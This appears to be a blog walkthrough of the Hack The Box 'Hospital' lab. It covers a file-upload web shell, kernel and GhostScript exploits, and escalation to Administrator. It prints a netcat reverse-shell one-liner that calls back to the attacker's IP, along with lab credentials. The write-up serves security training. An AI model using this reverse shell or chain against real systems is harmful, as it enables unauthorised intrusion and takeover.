---
layout: post
title: "HTB Hospital: Walkthrough"
date: 2025-01-09 10:00:00 +0000
categories: [HTB]
tags: [HTB, File Upload, GhostScript, Hash Cracking]
---

![image](https://github.com/user-attachments/assets/65b4546b-3fed-4dbb-81a7-6c574288e198)

## 0) Machine Overview
1. [Scans](#1-scans)
2. [Web Enumeration](#2-web-enumeration)
3. [Privilege Escalation](#3-privilege-escalation)
4. [Web Enumeration 2](#4-web-enumeration-2)
5. [Privilege Escalation 2](#5-privilege-escalation-2)
   
## 1) Scans
---
```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1801/tcp open  msmq
2103/tcp open  zephyr-clt
2105/tcp open  eklogin
2107/tcp open  msmq-mgmt
2179/tcp open  vmrdp
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
6404/tcp open  boe-filesvr
6406/tcp open  boe-processsvr
6407/tcp open  boe-resssvr1
6409/tcp open  boe-resssvr3
6617/tcp open  unknown
6640/tcp open  ovsdb
8080/tcp open  http
9389/tcp open  adws
```

Seems like there quite a few junk ports. But there is a webserver running on 8080.

Enum4Linux:

![image](https://github.com/user-attachments/assets/f29eaf12-93f8-48fd-9466-1e6aa6eec557)


Looks like we're dealing with an AD machine.



## 2) Web Enumeration
---

443 HTTPS:

![image](https://github.com/user-attachments/assets/0e1de071-a738-45b7-b5d6-755541b8915c)

8080 HTTP:

![image](https://github.com/user-attachments/assets/26983797-5515-44f3-a114-94dba8ebfac4)


Lets first mess with the 8080 webserver, as the one on 443 doesn't look too promising at the moment. I'll be running a gobuster scan on both webservers in the background.

We'll first create a user and see what kind of things we have access to.

![image](https://github.com/user-attachments/assets/1a79fca5-7a18-4feb-a708-381606386fa5)

In this case, we have a file upload form. We can try uploading a random image and see if we can find out where it gets stored.

If we run a gobuster, we notice a `/uploads` directory:

![image](https://github.com/user-attachments/assets/407b265f-cba6-4462-949f-c3e597369b31)

If we access `/uploads` directly, we get a 403 forbidden. However, if we try to access the full path assuming our file got stored here, we can access it:

![image](https://github.com/user-attachments/assets/d0a5799b-7516-4de4-8b7b-b1e6896b8292)

In this case, lets try uploading various kinds of file extensions using intruder and see what's accepted and what isn't:

![image](https://github.com/user-attachments/assets/114040ca-40b8-4c93-8e17-594df86b0806)
![image](https://github.com/user-attachments/assets/7498fc07-09da-4b75-b5ca-de86b9631c21)


As we can see, most our options for executing any kind of code seems low. However, if we research what file extensions can potentially execute PHP code, `.phar` is a possibility. And if we take a look at our Intruder output, `.phar` is actually accepted.

Lets try uploading a simple web-shell first to see if this'll actually work.

![image](https://github.com/user-attachments/assets/2cd63088-0883-4361-9263-aa919cc2a7c7)

![image](https://github.com/user-attachments/assets/860a4723-a765-4e6c-a7c6-d661c6cd7f50)

So the file actually uploaded, but when I try to run any commands, the page just returns a blank white page to me. Lets try a full-fledged rev-shell, the one by PentestMonkey.

![image](https://github.com/user-attachments/assets/123b976d-cb65-48f1-a55b-4595ca1e9476)

![image](https://github.com/user-attachments/assets/7535b4b4-88e8-406b-81f5-e0c8091111d0)

Doesn't work either, but at least we know our file is being executed.

I eventually came across [p0wny-shell](https://github.com/flozz/p0wny-shell) which gives an extremely interesting web-shell, and works perfectly.

![image](https://github.com/user-attachments/assets/907d5af5-bc32-4a31-af1f-0ce8c58dc2fe)


## 3) Privilege Escalation
---
Now if we recall earlier, our port scans gave us that this was a Windows machine. However in our current situation, we're on:

![image](https://github.com/user-attachments/assets/5fcef843-4212-45cc-8c10-ccd3fed57468)

Time to look around and see what we can find and do.

First off, I was able to find some MySQL DB creds in config.php

![image](https://github.com/user-attachments/assets/81f23b09-6298-4ee5-9f8d-d1420ac1c6d0)

`root:my$qls3rv1c3!`

To be able to actually access the DB, we'll need to get a proper shell. Lets upgrade our shell.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.14 5555 >/tmp/f
```

Once shell is caught, I like to run `export TERM=xterm` and `python3 -c 'import pty;pty.spawn("/bin/bash")'` to make sure my shell is all nice and cozy, and makes sure that there's proper I/O handling.

![image](https://github.com/user-attachments/assets/61892eb7-6d9d-4875-91ec-3bf03029a5f4)

![image](https://github.com/user-attachments/assets/8e6d92d6-eb57-4bf8-9078-16ea5fe0d360)

So we have 2 hashes now, obviously the 3rd belonging to our user. Lets try cracking, all though these are `bcrypt` hashes.

Admin's Hash:

![image](https://github.com/user-attachments/assets/d3713fc1-8d91-4b36-9b30-3156b82b6fee)

Patient's Hash:

![image](https://github.com/user-attachments/assets/4e126029-789c-4f44-bcb7-50ec7f7486fc)

Quite useless they seem.

After a while, I decided to check if the kernel version was vulnerable, as I had originally discarded it at first. And it seems it actually is to [CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629):

![image](https://github.com/user-attachments/assets/cbeb3347-4217-4a6b-8fb0-b32a44949a17)

With a very easy to use PoC, we can quickly run this `exploit.sh` script and escalate:

![image](https://github.com/user-attachments/assets/91170333-f4e8-47c1-8e6e-2bd02b7f0b4c)

Lets get a stable SSH connection now.

![image](https://github.com/user-attachments/assets/de7dadf8-24d8-49c3-abc0-6086257e208b)

![image](https://github.com/user-attachments/assets/b0d2b15f-5d47-4262-822b-20d29faf3a15)

## 4) Web Enumeration 2
---

First, I decided to start enumerating a bit of drwilliams home directory, and also took their hash and cracked it offline, with the hopes that I could potentially use the plain-text on SMB or LDAP.

![image](https://github.com/user-attachments/assets/922d6d9b-2399-41ad-9257-0b69c16ef5d6)

Yessir.

![image](https://github.com/user-attachments/assets/8edd4741-1a57-4685-8ba4-273992ca1ba0)

![image](https://github.com/user-attachments/assets/a5fac7ac-f0e1-4930-9a75-d1b0c139aa68)

Could only connect to SYSVOL, didn't find much in there.

Lets go try those credentials on the other web application:

![image](https://github.com/user-attachments/assets/184c900a-d054-4c17-9629-689a3f7776f0)

![image](https://github.com/user-attachments/assets/42158ebd-425b-47a9-a746-94c5d799b7e5)

If we read the email, he mentions something about `.eps` file extensions, and "GhostScript".

I didn't know what either of those were, so I made a quick google search, and to my surprise:

![image](https://github.com/user-attachments/assets/28480a00-bf13-49aa-af86-da163135a595)

From the description of the PoC, we can see this exploit happens upon GhostScript opening a `.eps` file and then mishandling permission validation, giving us RCE.

Lets give it a try:

![image](https://github.com/user-attachments/assets/f96c5887-df67-4150-b432-6e3a6f12febf)

Reply back to drbrown with the file attached, and *voila*:

![image](https://github.com/user-attachments/assets/748550c3-cf5d-487a-87e2-d550f6c22a2e)

Now to execute it:

![image](https://github.com/user-attachments/assets/0c795db8-7ff8-47d3-92fe-73e56fc61bf4)

![image](https://github.com/user-attachments/assets/3a1a7178-0d83-425f-a405-7082c222c769)

## 5) Privilege Escalation 2
---

At first, I tried uploading `SharpHound.exe` and uploading its data into BloodHound to see if there was a path from drbrown to Domain Admin. Unfortunately there wasn't. So I had to resort to some manual enumeration:

I checked out the `ghostscript.bat` file that was located in our user's documents directory, and found his password.

![image](https://github.com/user-attachments/assets/fd56669c-d726-4473-b251-b4be5537ecbe)

`chr!$br0wn`

Why don't we try RDP'ing into the machine now?

![image](https://github.com/user-attachments/assets/4cf8a5bb-78a4-43ae-b30d-0f2006c0c8db)

Now that we're connected, lets check Task Manager. If we notice, we'll see the web server that's running.

![image](https://github.com/user-attachments/assets/301fa1dc-f7ba-44a8-99a4-8bff49e85bea)

We can check the `Properties` of the executable that's running the service. We can see that its `httpd.exe`

![image](https://github.com/user-attachments/assets/4d0754e7-2e26-40dd-9f0c-bb5558125597)

Well... What if that web server is running in the context of Administrator or System. We could try uploading our own file and then access it and get a shell in that context. And that is exactly the case in this scenario, if we run `tasklist /V`:

![image](https://github.com/user-attachments/assets/893d5258-d682-4052-ab31-bbcc1dfe6c5b)

*(Note: Now typically, we could have just ran `tasklist /V` within our shell without having to RDP. However, I was unable to run it for some reason due.)*

We can do a quick ChatGPT and see that:
`In XAMPP, the web server files are typically stored in the "htdocs" directory.`

So now we'll upload a file into the `C:/xampp/htdocs`, and then access it via the URL.

![image](https://github.com/user-attachments/assets/b2f2a051-9ab9-4a30-9913-dbee70ee3868)

Pwned.

---
















































   
